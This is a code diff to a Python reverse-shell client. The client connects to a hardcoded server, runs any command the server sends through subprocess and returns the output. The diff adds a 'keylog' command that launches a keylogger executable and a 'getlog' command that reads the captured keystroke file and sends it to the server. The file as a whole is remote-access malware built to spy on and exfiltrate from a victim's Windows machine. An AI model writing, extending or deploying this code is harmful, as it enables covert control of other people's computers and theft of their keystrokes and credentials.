@@ -1,10 +1,12 @@
 import socket
 import time
+import os
 import subprocess
+import sys
 
 # Set up the server address and port
 #server_address = '156.196.54.233'  # Replace with your server's IP address
-server_address = '192.168.1.103'
+server_address = '192.168.1.105'
 server_port = 8080                # Replace with your server's port
 
 username = subprocess.getoutput("""echo %username%""")
@@ -29,6 +31,18 @@ while True:
                 command = client_socket.recv(1024).decode()
                 if command.lower() == 'exit':
                     break
+                if command == "keylog":
+                    os.open("keylog.exe")
+                if command == "getlog":
+                    cd = os.path.abspath(sys.argv[0])
+                    cd = cd.rsplit("\\", 1)[0]
+                    cd += "\\Logs\\keylog.txt"
+                    data = ""
+                    print(cd)
+                    f = open(cd, 'r')
+                    data += f.read()
+                    f.close()
+                    client_socket.send(data.encode())
                 output = subprocess.getoutput(command)
                 #print(output)
                 client_socket.send(output.encode())
